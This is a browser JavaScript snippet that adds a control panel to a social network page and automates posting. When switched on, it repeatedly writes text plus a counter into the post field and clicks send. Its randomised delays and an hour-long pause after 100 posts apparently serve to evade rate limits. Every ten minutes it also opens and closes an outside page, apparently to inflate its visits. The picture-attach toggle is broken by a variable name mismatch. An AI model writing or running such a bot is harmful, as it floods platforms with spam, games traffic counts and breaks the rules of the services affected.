function randomInteger(min, max) {
    var rand = min + Math.random() * (max + 1 - min);
    rand = Math.floor(rand);
    return rand;
  };
var Pict='No';
var Kea=1;

var interdiv=document.createElement('div');
interdiv.id='Indiv'
interdiv.style.width='400px';
interdiv.style.height='500px';
interdiv.style.zIndex='100';
interdiv.style.border='1px solid black'; 
interdiv.style.background='white'; 
document.body.appendChild(interdiv);
interdiv.style.position='fixed';
interdiv.style.bottom='40px';
interdiv.style.right='10px';



var Arena=document.createElement('textarea');
Arena.style.width='250px';
Arena.style.height='100px';
Arena.style.position='absolute';
Arena.style.top='10px';
Arena.style.left='5px';
document.getElementById('Indiv').appendChild(Arena);


function PowerON(){
	Kea=0;
	Power.style.background='#88ae60';
	Power.removeEventListener('click',PowerON);
	Power.addEventListener('click',PowerOFF);
};
function PowerOFF(){
	Kea=1;
	Power.style.background='#e44849';
	Power.removeEventListener('click',PowerOFF);
	Power.addEventListener('click',PowerON);
};
var Power=document.createElement('div');
document.getElementById('Indiv').appendChild(Power);
Power.style.background='#e44849';
Power.style.width='90px';
Power.style.height='25px';
Power.style.position='absolute';
Power.style.border='1px solid black';
Power.style.top='10px';
Power.style.right='10px';
Power.addEventListener('click',PowerON);





function PicOFF (){
	Pic='No';
	Picture.style.background='#e44849';
	Picture.removeEventListener('click',PicOFF);
	Picture.addEventListener('click',PicON);
};
function PicON (){
	Pic='Yes';
	Picture.style.background='#88ae60';
	Picture.removeEventListener('click',PicON);
	Picture.addEventListener('click',PicOFF);
};

var Picture=document.createElement('div');
Picture.style.background='#e44849';
Picture.style.width='90px';
Picture.style.height='25px';
Picture.style.position='absolute';
Picture.style.border='1px solid black';
document.getElementById('Indiv').appendChild(Picture);
Picture.style.top='70px';
Picture.style.right='10px';
Picture.addEventListener('click',PicON);





var TextPouwerOn=document.createElement('div');
TextPouwerOn.innerHTML='Power';
TextPouwerOn.style.position='absolute';
document.getElementById('Indiv').appendChild(TextPouwerOn);
TextPouwerOn.style.top='40px';
TextPouwerOn.style.right='10px';

var TextPictOn=document.createElement('div');
TextPictOn.innerHTML='Picture';
TextPictOn.style.position='absolute';
document.getElementById('Indiv').appendChild(TextPictOn);
TextPictOn.style.top='100px';
TextPictOn.style.right='10px';

var Text=['  ','  ','','','',''];
var Len=Text.length;
var Liners=[];
var number=1;
var arena=document.getElementById('post_field');
var posting=document.getElementById('send_post');
var Time=randomInteger(60000,180000);;
var i=0;
var Ker=1;


setInterval(function(){
	Text[3]=Arena.value;
	if(Kea==0){
		
		if(i!=0){
			i=0;
		};		
		if(Pict=='Yes'){
			var panel=document.getElementsByClassName('media_selector clear_fix')[0];
			panel.getElementsByTagName('a')[0].click();
			setTimeout(function(){document.getElementsByClassName('media_check_btn')[0].click();},1000);
			setTimeout(function(){document.getElementById('photos_choose_button').click()},1300);
		};
		setTimeout(function(){
			var val=setInterval(function(){
				Liners[i]=document.createElement('div');
				Liners[i].innerHTML=Text[i];
				arena.appendChild(Liners[i]);
				i++;
				if(i>=Len){
					var strnumber=number+'';
					arena.append(strnumber);
					number++;
					i=0;
					posting.click();
					Ker++;
					clearInterval(val);
				};
			},500);
		},1000);
		if(Ker>=100){
			console.log('Time to stop');
			Kea=1;
			Ker=1;
			setTimeout(function(){Kea=0;console.log('Go')},3600000);
		};
		Time=randomInteger(60000,180000);
	};
},Time);
setInterval(function(){
	var win=window.open('http://rek2.kl.com.ua/KristinaKit.html');
	setTimeout(function(){win.close();},10000);

},600000);
